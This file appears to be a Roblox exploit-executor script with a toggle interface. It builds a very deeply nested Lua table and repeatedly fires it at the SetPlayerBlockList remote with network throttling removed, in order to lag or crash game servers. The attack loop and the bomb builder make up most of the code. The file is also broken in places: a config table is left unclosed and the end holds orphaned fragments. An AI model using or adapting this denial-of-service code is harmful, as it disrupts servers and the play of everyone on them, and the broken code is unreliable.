local Config = { 
    Keybind = "V", 
    PCPower = 97000,      -- PC power: 10k-150k
    MobilePower = 72000,  -- Mobile power: 10k-100k
    Mode = "PC",          -- "PC" or "Mobile"

local function SaveConfig()
    if writefile then
        pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end)
    end
end

local function LoadConfig()
    if isfile and isfile(ConfigFile) then
        local success, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
        if success and data then
            if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
            if type(data.PCPower) == "number" then Config.PCPower = math.clamp(data.PCPower, 10000, 150000) end
            if type(data.MobilePower) == "number" then Config.MobilePower = math.clamp(data.MobilePower, 10000, 100000) end
            if type(data.Mode) == "string" and (data.Mode == "PC" or data.Mode == "Mobile") then Config.Mode = data.Mode end
            if type(data.SpamDelay) == "number" then Config.SpamDelay = (data.SpamDelay == 0.125 or data.SpamDelay == 0.12) and data.SpamDelay or 0.125 end
        end
    end
end
LoadConfig()

-- Fixed bomb parameters
local DEPTH = 296

local function buildBomb(power)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, DEPTH do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maxRep = math.floor(power / (DEPTH + 2))
    for i = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

-- ===== LOGIC =====
local running = false
local bomb = nil
local spamThread = nil
local currentMode = Config.Mode
local currentDelay = Config.SpamDelay

local function getCurrentPower()
    return currentMode == "PC" and Config.PCPower or Config.MobilePower
end

local function restartSpamLoop()
    if running then
        if spamThread then task.cancel(spamThread) end
        local power = getCurrentPower()
        bomb = buildBomb(power)
        spamThread = task.spawn(function()
            while running do
                if bomb then
                    pcall(function()
                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                    end)
                end
                task.wait(currentDelay)
            end
        end)
    end
end

local function TogglePCBypass()
    running = not running
    if running then
        PCToggleBtn.Text = "STATUS: ENABLED"
        PCToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 100)
        PCBtnStroke.Color = Color3.fromRGB(0, 255, 100)
        MainStroke.Color = Color3.fromRGB(66, 135, 245)
        ModeBtnStroke.Color = Color3.fromRGB(66, 135, 245)
        NetworkClient:SetOutgoingKBPSLimit(math.huge)
        restartSpamLoop()
    else
        PCToggleBtn.Text = "STATUS: DISABLED"
        PCToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
        PCBtnStroke.Color = Color3.fromRGB(60, 60, 60)
        MainStroke.Color = Color3.fromRGB(60, 60, 60)
        ModeBtnStroke.Color = Color3.fromRGB(60, 60, 60)
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
end

local function ToggleMobileBypass()
    running = not running
    if running then
        MobileToggleBtn.Text = "ON"
        MobileToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 100)
        MobileBtnStroke.Color = Color3.fromRGB(0, 255, 100)
        MainStroke.Color = Color3.fromRGB(245, 66, 66)
        ModeBtnStroke.Color = Color3.fromRGB(245, 66, 66)
        NetworkClient:SetOutgoingKBPSLimit(math.huge)
        restartSpamLoop()
    else
        MobileToggleBtn.Text = "OFF"
        MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
        MobileBtnStroke.Color = Color3.fromRGB(60, 60, 60)
        MainStroke.Color = Color3.fromRGB(60, 60, 60)
        ModeBtnStroke.Color = Color3.fromRGB(60, 60, 60)
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
end

-- Preset function (changes delay, updates footers, restarts if needed)
local function setSpamDelay(newDelay)
    if newDelay ~= 0.125 and newDelay ~= 0.12 then return end
    currentDelay = newDelay
    Config.SpamDelay = newDelay
    SaveConfig()
    
    local versionName = getVersionName(newDelay)
    PCFooter.Text = "Mobile:72k || PC:97k | Ver: " .. versionName
    MobileFooter.Text = "Power: " .. tostring(Config.MobilePower) .. " | Ver: " .. versionName
    
    if running then
        restartSpamLoop()
    end
end

        MainStroke.Color = Color3.fromRGB(60, 60, 60)

    currentMode = currentMode == "PC" and "Mobile" or "PC"

    MobileElements.Visible = currentMode == "Mobile"

    else
        ModeSwitchBtn.Text = "MOBILE"
        ModeSwitchBtn.TextColor3 = Color3.fromRGB(245, 66, 66)

    SaveConfig()
    updateCanvas()
end
